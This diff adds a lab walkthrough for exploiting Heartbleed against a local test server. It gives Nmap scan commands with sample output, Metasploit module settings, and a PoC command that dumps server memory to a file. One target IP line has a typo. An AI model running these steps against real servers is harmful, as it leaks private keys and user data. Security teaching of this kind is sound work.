@@ -1,0 +1,58 @@
+#Software need: nmap, msfconsole (metasploit)
+#For nmap ssl-heartbleed script:
+#	If you have Nmap version 6.46 or 6.47, you can skip this section, since you already have the ssl-heartbleed script and the tls.lua library.
+#	Locate your Nmap files directory. On Linux, this is usually /usr/share/nmap/ or /usr/local/share/nmap/. On Windows, it's either C:\Program Files\Nmap\ or C:\Program Files (x86)\Nmap\
+#	Download the tls.lua and stdnse.lua libraries and put them in the nselib directory.
+#	Download the ssl-heartbleed.nse script and put it in the scripts directory
+#	Optionally, run nmap --script-updatedb to allow the script to run according to category (not necessary for this example).
+#
+# Server openssl 1.0.1 - 1.0.1f
+
+#Open browser and see the web page if support https
+# In our case the ip is 192.168.56.103 and we have a wordpress simple blog with self-signed certificate
+https://192.168.56.103
+
+#Check if the server is affected, in our case the server have ip 192.168.56.103
+nmap -p 443 --script ssl-heartbleed 192.168.56.103
+
+#if the server is affected of Heart-Bleed
+| ssl-heartbleed: 
+|   VULNERABLE:
+|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
+|     State: VULNERABLE
+|     Risk factor: High
+|     Description:
+|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
+|           
+|     References:
+|       http://cvedetails.com/cve/2014-0160/
+|       http://www.openssl.org/news/secadv_20140407.txt 
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
+MAC Address: 08:00:27:5B:CC:F8 (Cadmus Computer Systems)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
+
+#now start metasploit
+msfconsole
+
+#use heartbleed script
+use auxiliary/scanner/ssl/openssl_heartbleed
+
+#show options available
+show options
+
+#set the target IP
+set RHOSTS 192.169.56.103
+
+#set the VERBOSE true to show the memory information
+set VERBOSE true
+
+#run exploit
+run
+
+#For running heartbleed exploit in our application and analyze dumped memory can use
+#SensePost exploit --> https://github.com/sensepost/heartbleed-poc, for example run the exploit and
+#save the output in the file memory.(Port=443 and server ip=192.168.56.103)
+python heartbleed-poc.py 192.168.56.103 -p 443 -f memory
+
+#have fun! (615-ter)
